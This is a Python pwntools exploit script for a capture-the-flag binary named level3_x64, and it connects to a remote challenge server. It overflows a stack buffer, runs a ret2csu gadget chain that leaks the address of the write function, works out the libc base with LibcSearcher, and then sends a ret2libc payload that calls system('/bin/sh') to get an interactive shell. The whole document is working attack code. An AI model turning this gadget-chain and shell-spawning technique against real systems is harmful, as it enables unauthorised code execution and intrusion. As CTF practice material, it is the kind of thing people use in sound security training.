from pwn import *
from LibcSearcher import *
context(log_level='debug', arch='amd64', os='linux')

class CSUgadget():
  def __init__(self, gadget1, gadget2):
    self.gadget1 = gadget1
    self.gadget2 = gadget2
    self.rbx = 0x0
    self.rbp = 0x1
    self.r12 = 0x0
    self.r13 = 0x0
    self.r14 = 0x0
    self.r15 = 0x0

  def payload(self):
    return p64(self.gadget1) + p64(self.rbx) + p64(self.rbp) + p64(self.r12) + p64(self.r13) + p64(self.r14) + p64(self.r15) + p64(self.gadget2)



if len(sys.argv) > 1:
  conn = remote('node4.buuoj.cn', 28766)
else:
  conn = process(sys.argv[0][:-7])
  #gdb.attach(conn)

# gadget
pop_6reg = 0x004006aa
mov_rdx_r13 = 0x00400690
pop_rdi = 0x004006b3
vuln = 0x004005e6

elf = ELF('./level3_x64')
leak_func = 'write'
write_plt = elf.plt['write']
write_got = elf.got['write']

conn.recvuntil(b'Input:\n')
csugadget = CSUgadget(pop_6reg, mov_rdx_r13)
csugadget.r12 = write_got
csugadget.r13 = 0x8
csugadget.r14 = write_got
csugadget.r15 = 0x1
payload = cyclic(0x80 + 0x8) 
payload += csugadget.payload()
payload += p64(0) * 7
payload += p64(vuln)
conn.sendline(payload)

leak_addr = u64(conn.recv(8))
libc = LibcSearcher(leak_func, leak_addr)
libc_base = leak_addr - libc.dump(leak_func)
system = libc_base + libc.dump('system')
binsh = libc_base + libc.dump('str_bin_sh')

payload = cyclic(0x88) + p64(pop_rdi) + p64(binsh) + p64(system)
conn.recvuntil(b'Input:\n')
conn.send(payload)
conn.interactive()


